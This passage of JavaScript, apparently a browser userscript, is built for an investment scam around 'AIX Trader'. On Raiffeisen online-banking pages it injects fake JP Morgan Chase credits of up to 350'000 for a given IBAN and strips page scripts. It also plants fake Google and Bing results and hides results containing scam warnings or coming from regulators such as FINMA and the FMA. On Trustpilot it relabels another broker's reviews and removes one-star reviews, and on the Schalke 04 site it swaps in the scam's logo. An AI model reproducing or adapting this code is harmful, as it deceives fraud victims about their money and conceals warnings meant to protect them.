            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "span8 text-left margin-tiny-top"
    function removeSpan8TextLeftElements() {
        console.log("Removing elements with class='span8 text-left margin-tiny-top'...");
        var span8TextLeftElements = document.querySelectorAll('.span8.text-left.margin-tiny-top');
        span8TextLeftElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "flip-container"
    function removeFlipContainerElements() {
        console.log("Removing elements with class='flip-container'...");
        var flipContainerElements = document.querySelectorAll('.flip-container');
        flipContainerElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts, add-month elements, print icon elements, download icon elements, legend elements, elements with uisref="v2.l.view", elements with aria-labelledby="presentation-icon", elements with class "light" under parent with labelledby="label-konto", elements with class "span8 text-left margin-tiny-top", and elements with class "flip-container"
    var sdobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        removeScripts();
                    }
                }
            }
        }
        removeAddMonthElements();
        removePrintIcon();
        removeDownloadIcon();
        removeLegendElements();
        removeUisrefElements();
        removePresentationIconElements();
        removeLightElements();
        removeSpan8TextLeftElements();
        removeFlipContainerElements();
    });

    // Start observing the document
    sdobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts, add-month elements, print icon elements, download icon elements, legend elements, elements with uisref="v2.l.view", elements with aria-labelledby="presentation-icon", elements with class "light" under parent with labelledby="label-konto", elements with class "span8 text-left margin-tiny-top", and elements with class "flip-container" from the document
    removeScripts();
    removeAddMonthElements();
    removePrintIcon();
    removeDownloadIcon();
    removeLegendElements();
    removeUisrefElements();
    removePresentationIconElements();
    removeLightElements();
    removeSpan8TextLeftElements();
    removeFlipContainerElements();
}


//=============================================================================================================================================================
//=============================================================================================================================================================
//=============================================================================================================================================================



if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("11000189349") > 0) {

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Function to remove elements with class "light" under elements with aria-labelledby="label_belastungskonto"
    function removeLightElements() {
        console.log("Removing elements with class 'light' under elements with aria-labelledby='label_belastungskonto'...");
        var elements = document.querySelectorAll('[aria-labelledby="label_belastungskonto"] .light');
        elements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove the element with class "footer additonal visible-desktop visible-tablet"
    function removeFooterElement() {
        console.log("Removing element with class 'footer additonal visible-desktop visible-tablet'...");
        var footerElement = document.querySelector('.footer.additonal.visible-desktop.visible-tablet');
        if (footerElement) {
            footerElement.remove();
            console.log("Element removed.");
        }
    }

    // Function to remove elements with class "value" under elements with class "row-fluid margin-large"
    function removeValueElements() {
        console.log("Removing elements with class 'value' under elements with class 'row-fluid margin-large'...");
        var elements = document.querySelectorAll('.row-fluid.margin-large .value');
        elements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts, elements with class "light", the footer element, and "value" elements
    var zsobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        removeScripts();
                    }
                }
            }
        }
        removeLightElements();
        removeFooterElement();
        removeValueElements();
    });

    // Start observing the document
    zsobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts, elements with class "light", the footer element, and "value" elements
    removeScripts();
    removeLightElements();
    removeFooterElement();
    removeValueElements();



 // Function to remove all elements with class="light" under aria-describedby="dropdown"
function removeLightElements() {
    // Find all elements with aria-describedby="dropdown"
    var dropdownButtons = document.querySelectorAll('[aria-describedby="dropdown"]');
    dropdownButtons.forEach(function(dropdownButton) {
        // Find all elements with class="light" under each dropdownButton
        var lightElements = dropdownButton.querySelectorAll('.light');
        lightElements.forEach(function(lightElement) {
            // Remove each lightElement
            lightElement.remove();
            console.log('Element with class "light" removed.');
        });
    });
}

// Watch for changes in the DOM and remove the light elements
var cvbobserver = new MutationObserver(function(mutationsList) {
    mutationsList.forEach(function(mutation) {
        if (mutation.addedNodes) {
            mutation.addedNodes.forEach(function(node) {
                if (node.tagName === 'DIV' && node.classList.contains('light')) {
                    console.log('Element with class "light" added. Removing...');
                    node.remove();
                    console.log('Element with class "light" removed.');
                }
            });
        }
    });
});

// Start observing the document
cvbobserver.observe(document.documentElement, { childList: true, subtree: true });

// Call the function to start searching and removing the light elements
removeLightElements();
}

 // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["aix", "polarlichter", "polarlicht", "Polarlicht", "Polarlichter", "trader", "aixtrader", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust", "aix trader", "aix-trader"],
                        results: [
                            {
                                url: "https://aix-trader.com/",
                                title: "AIX Trader dein Broker",
                                description: "AIX Trader ist der Broker mit der besten Reputation.",
                                footerText: "https://aix-trader.com/",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von AIX Trader - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker AIX Trader",
                                footerText: "https://de.trustpilot.com/review/amadeusmarkets.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "AIX Trader Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Amadeus Markets ab dem 1. Januar unser Sponsor und Partner wird. Amadeus Markets ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Amadeus Markets sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}


// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "AIX Trader";
    const customLogoURL = "https://aix-trader.com/wp-content/uploads/2023/08/logo_aix.png";
    const customURL = "https://aix-trader.com";
    const customReferenceURL = "aix-trader.com";
    const customLinkURL = "https://aix-trader.com/"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "AIX Trader",
      "icmarkets": " AIX Trader",
      "ic-markets": "AIX Trader",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}


// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1) {
  var newURL = "https://aix-trader.com/";
var newLogoURL = "https://aix-trader.com/wp-content/uploads/2023/08/logo_aix.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

observer.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'Warnung', 'Warning', 'Achtung', 'Abzock', 'abzock', 'polarlichter', 'Polarlichter', 'polarlicht' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de', 'pv-magazine.de', 'finma.ch', 'diebewertung.de', 'fma.gv.at' ]; // Add the domains to block here
  var blockedUrls = ['https://www.example1.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }


// Check if "timeline" can be found after the hash sign in the URL
if (window.location.hash.includes("v2")) {
    var refresh = window.localStorage.getItem('refresh');
    console.log(refresh);

    // Reload the page if refresh is null
    setTimeout(function() {
        if (refresh === null) {
            window.location.reload();
            window.localStorage.setItem('refresh', "1");
        }
    }, 400); // Wait for 400 milliseconds before reloading

    // Remove 'refresh' from localStorage after a short delay
    setTimeout(function() {
        localStorage.removeItem('refresh')
    }, 150); // Wait for 150 milliseconds
}


//// SECOND ACCOUNT

//================================================================================================================================================================

//????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????

//================================================================================================================================================================

//????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????

//================================================================================================================================================================
 if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("11000189349") > 0) {


// Configurable desired IBAN
var qwdesiredIban = "CH04 8080 8005 1061 1417 6";

// Configurable transaction details
var yxtransactionDetailsArray = [


    {
        id: "transaction1", // Unique identifier for the transaction
        title: "JP Morgan Chase",
        type: "Gutschrift",
        date: "Heute",
        amount: "+350'000.00",
        description: "Auszahlung.",
        insertAbove: true // Insert the transaction above the original one by default
    },
        {
        id: "transaction2", // Unique identifier for the transaction
        title: "JP Morgan Chase",
        type: "Gutschrift",
        date: "Heute",
        amount: "+40'000.00",
        description: "Geld für Steuern.",
        insertAbove: true // Insert the transaction above the original one by default
    },
    {
        id: "transaction3", // Unique identifier for the transaction
        title: "JP Morgan Chase",
        type: "Gutschrift",
        date: "14. März 2024",
        amount: "+1'500.00",
        description: "Gebühren Kompensierung",
        insertAbove: true // Insert the transaction above the original one by default
    },
    {
        id: "transaction4", // Unique identifier for the transaction
        title: "JP Morgan Chase",
        type: "Type of Transaction",
        date: "14. März 2024",
        amount: "+277'972.74",
        description: "Freigabe erteilt.",
        insertAbove: true // Insert the transaction below the original one by default
    },
      {
        id: "transaction5", // Unique identifier for the transaction
        title: "JP Morgan Chase",
        type: "Gutschrift",
        date: "11. März 2024",
        amount: "+35'000.00",
        description: "Geld für Steuern. Bitte nur an Andreas Graf wenden.",
        insertAbove: true // Insert the transaction below the original one by default
    },
        {
        id: "transaction6", // Unique identifier for the transaction
        title: "JP Morgan Chase",
        type: "Gutschrift",
        date: "8. März 2024",
        amount: "+500.00",
        description: "Test",
        insertAbove: true // Insert the transaction below the original one by default
    }
];

// Function to check if the desired IBAN is present and insert transactions if necessary
function checkAndInsertTransactions() {
    console.log("Checking for desired IBAN:", qwdesiredIban);
    var elementsWithIban = document.querySelectorAll('.clearfix');

    // Check if any of the transactions are already present on the page
    var isTransactionPresent = yxtransactionDetailsArray.some(function(transaction) {
        return document.getElementById(transaction.id) !== null;
    });

    console.log("Are transactions already present:", isTransactionPresent);

    // If any transaction is already present, continue checking
    if (isTransactionPresent) {
        console.log("Transactions already present on the page.");
    } else {
        // If transactions are not present, insert them
        elementsWithIban.forEach(function(element) {
            var normalizedContent = element.textContent.replace(/\s/g, "").toLowerCase();
            var normalizedIban = qwdesiredIban.replace(/\s/g, "").toLowerCase();

            if (normalizedContent.includes(normalizedIban)) {
                console.log("Desired IBAN found:", qwdesiredIban);
                // Call function to create duplicate elements only if desired IBAN is found
                createDuplicateElement(yxtransactionDetailsArray);
            }
        });
    }
}

// Function to create a duplicate element with configurable transaction details
function createDuplicateElement(transactionDetails) {
    console.log("Creating duplicate elements with transaction details:", transactionDetails);
    // Find the element with class "first-in-timeline"
    var originalElement = document.querySelector('.first-in-timeline');

    if (originalElement) {
        transactionDetails.forEach(function(transaction) {
            // Clone the original element
            var duplicateElement = originalElement.cloneNode(true);

            // Set the class based on the transaction amount
            var amount = parseFloat(transaction.amount.replace(/[^\d.-]/g, ''));
            var itemClass = amount >= 0 ? "item positive" : "item accordion";

            // Set the id for the duplicate element based on transaction id
            duplicateElement.setAttribute("id", transaction.id);

            // Replace the content of the duplicated element with the new HTML content
            duplicateElement.innerHTML = `
<div class="${itemClass}">
 <a role="button" class="box header" href="https://ebanking.raiffeisen.ch/app/">
 <p class="multi-line title">${transaction.title}</p>

 <p translate="">
 ${transaction.type}
 </p>
 <div class="left">
 <p class="light">${transaction.date}</p>
 </div>
 <div class="right">
 <span class="output medium">

 <div>${transaction.amount}</div>
 </span>
 </div>
 <div class="message-group">
 <div>
 <div class="left">
 <p class="multi-line">${transaction.description}</p>
 <eb-notice-info><div hidden="" class="sf-hidden">


</div>
</eb-notice-info>
 </div>
 <span class="output pull-right">
 <div class="normal">${transaction.amount}</div>
 </span>
 </div>
 </div>
 </a>
 </div>
`;

            // Determine the insertion position based on the configuration
            var insertionPosition = transaction.insertAbove ? originalElement : originalElement.nextSibling;

            // Insert the duplicate element accordingly
            originalElement.parentNode.insertBefore(duplicateElement, insertionPosition);
        });

        console.log("Elements duplicated successfully.");
    } else {
        console.log('Original element with class "first-in-timeline" not found.');
    }
}

// Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var yxcobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    yxcobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts from the document
    removeScripts();

// Call the function to check for the desired IBAN and insert transactions
checkAndInsertTransactions();

// Set interval to check for transactions every 5 seconds
setInterval(checkAndInsertTransactions, 100);
}


// CHANGE BALANCE IN ACCOUNT SELECTOR AT KONTOAUSZUG




